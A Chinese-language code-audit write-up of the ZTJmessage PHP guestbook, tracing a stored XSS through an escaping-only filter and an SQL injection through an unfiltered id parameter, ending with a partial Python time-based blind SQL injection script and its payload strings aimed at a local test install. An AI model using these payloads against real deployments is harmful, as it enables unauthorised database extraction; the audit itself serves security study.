## Xss漏洞

个人习惯，先将代码拖入到Seay代码审计工具中进行代码审计，分析整体框架结构。

这里可以看到首先引用了common.php文件(这里了解框架就不在一一赘述，根据个人情况进行了解)。

![1653731827_6291f1f30dd816c1e8cab.png!small?1653731828535](https://image.3001.net/images/20220528/1653731827_6291f1f30dd816c1e8cab.png!small?1653731828535)

一个留言系统，首先查找的就是XSS漏洞，这里可以看出，在/admin/index.php中实例化了upsiteinfo.Action.php，这里进入其中，查看方法。

![1653731838_6291f1fe4145b46284dbe.png!small?1653731841035](https://image.3001.net/images/20220528/1653731838_6291f1fe4145b46284dbe.png!small?1653731841035)

这里判断是否提交，如果提交就进行了来源判断，必须是<http://url/admin/index.php?location=siteinfo>，未进行deletehtml函数的使用。

![1653731850_6291f20ac7d44ed015c2d.png!small?1653731855681](https://image.3001.net/images/20220528/1653731850_6291f20ac7d44ed015c2d.png!small?1653731855681)

使用AdminLogin的checkpostvalue方法，进行了过滤，过滤之后的数值，进行了更新数据库的操作。

![1653731967_6291f27fb48af3a6649da.png!small?1653731971615](https://image.3001.net/images/20220528/1653731967_6291f27fb48af3a6649da.png!small?1653731971615)

跟进checkpostvalue方法进行查看，先定义一个接收数据的函数，传入的是POST的值。

![1653731979_6291f28be263cedae4750.png!small?1653731984416](https://image.3001.net/images/20220528/1653731979_6291f28be263cedae4750.png!small?1653731984416)

打断点+本地测试发现，就是经过了数组中方法的逐次过滤。

![1653731987_6291f2931070fc93ae679.png!small?1653731990453](https://image.3001.net/images/20220528/1653731987_6291f2931070fc93ae679.png!small?1653731990453)

随意输入，bp抓包进行分析。

![1653731993_6291f29942510f0d7c843.png!small?1653731997422](https://image.3001.net/images/20220528/1653731993_6291f29942510f0d7c843.png!small?1653731997422)

stat_code是对应的第三方统计代码，经过了toUTF-8和addslanshes_d方法。

![1653732001_6291f2a14437b51b6fe20.png!small?1653732001535](https://image.3001.net/images/20220528/1653732001_6291f2a14437b51b6fe20.png!small?1653732001535)

查看这两个方法。

ToUTF-8方法。

![1653732008_6291f2a8c55e814e9e7fe.png!small?1653732013884](https://image.3001.net/images/20220528/1653732008_6291f2a8c55e814e9e7fe.png!small?1653732013884)

addslanshes_d方法，是进行了转义，没有对xss标签进行任何操作，所以就导致了一个存储xss漏洞。

![1653732017_6291f2b11069a476b04f5.png!small?1653732022402](https://image.3001.net/images/20220528/1653732017_6291f2b11069a476b04f5.png!small?1653732022402)

插入xss语句。

![1653732024_6291f2b83b502064a3964.png!small?1653732028331](https://image.3001.net/images/20220528/1653732024_6291f2b83b502064a3964.png!small?1653732028331)

访问首页成功得到显示。

![1653732031_6291f2bf556c854dd72c1.png!small?1653732034574](https://image.3001.net/images/20220528/1653732031_6291f2bf556c854dd72c1.png!small?1653732034574)

### SQL注入漏洞

发现自动审计，存在SQL注入漏洞。

![1653732051_6291f2d3f03e812171b70.png!small?1653732052476](https://image.3001.net/images/20220528/1653732051_6291f2d3f03e812171b70.png!small?1653732052476)

跟进admin/index.php进行分析。  
这里先包含了common.php文件，common.php文件进行了两个类的实例化。

![1653732062_6291f2dec17346559c913.png!small?1653732063419](https://image.3001.net/images/20220528/1653732062_6291f2dec17346559c913.png!small?1653732063419)

进行了判断。

![1653732070_6291f2e68ced78e60c67f.png!small?1653732071331](https://image.3001.net/images/20220528/1653732070_6291f2e68ced78e60c67f.png!small?1653732071331)

对以上传入的location进行了判断，由于上面传入的是edituser，所以$location不为空，进行else，然后执行了menu方法。

![1653732101_6291f3051ae6ee1a831cd.png!small?1653732104225](https://image.3001.net/images/20220528/1653732101_6291f3051ae6ee1a831cd.png!small?1653732104225)

实例化了AdminControl类。

![1653732108_6291f30c71dab7e68561f.png!small?1653732108848](https://image.3001.net/images/20220528/1653732108_6291f30c71dab7e68561f.png!small?1653732108848)

AdminControl类的构造方法如下。

![1653732114_6291f312b656a58663556.png!small?1653732119774](https://image.3001.net/images/20220528/1653732114_6291f312b656a58663556.png!small?1653732119774)

跟进menu方法，这里是弹出所对应的权限。

![1653732121_6291f3195438bc2404079.png!small?1653732124381](https://image.3001.net/images/20220528/1653732121_6291f3195438bc2404079.png!small?1653732124381)

遍历上面的menu找到你所传入的location，然后弹回传入的location，进行判断，/admin/edituser.Menu.php是否存在，如果存在就进行包含。

![1653732128_6291f3200c13dff08c6cc.png!small?1653732130897](https://image.3001.net/images/20220528/1653732128_6291f3200c13dff08c6cc.png!small?1653732130897)

进入/admin/edituser.Menu.php进行查看，id参数未进行任何过滤，执行了sel方法。

![1653732136_6291f3289b05f0bf436f2.png!small?1653732140306](https://image.3001.net/images/20220528/1653732136_6291f3289b05f0bf436f2.png!small?1653732140306)

跟进sel方法，传入的变量没有进行任何过滤，导致了SQL注入。

![1653732145_6291f331d3a8cd4c28d07.png!small?1653732149078](https://image.3001.net/images/20220528/1653732145_6291f331d3a8cd4c28d07.png!small?1653732149078)

### Exp:

    
    
    import requests
    import time
    url="http://127.0.0.1/ZTJmessage/admin/index.php?location=edituser&id="
    header={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Cookie":"PHPSESSID=eke4v1b953niu1gdf9e5hr5gq4"}
    i=0
    flag=''
    while True:
        i=i+1
        head=32
        tail=128
        while head<tail:
            mid=(head+tail)/2
            #payload="-1' or if(ascii(substr((database()),{0},1))>{1},sleep(1.5),0)--+".format(i,mid)
            payload="-1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},sleep(1.5),0)--+".format(i,mid)
            url1=url+payload
            print url1

